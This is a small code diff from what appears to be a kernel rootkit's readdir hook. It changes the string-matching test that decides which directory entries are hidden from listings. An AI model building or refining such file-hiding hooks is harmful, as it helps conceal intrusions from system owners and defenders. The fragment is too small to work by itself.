@@ -944,7 +944,7 @@ READDIR_HOOK_START(root)
 
     list_for_each_entry(f, &file_list, list) {
         //if (strcmp(name, f->name) == 0) {
-	if (strstr(f->name, name) != NULL) {
+	if (strstr(name, f->name) != NULL) {
             return 0;
         }
     }
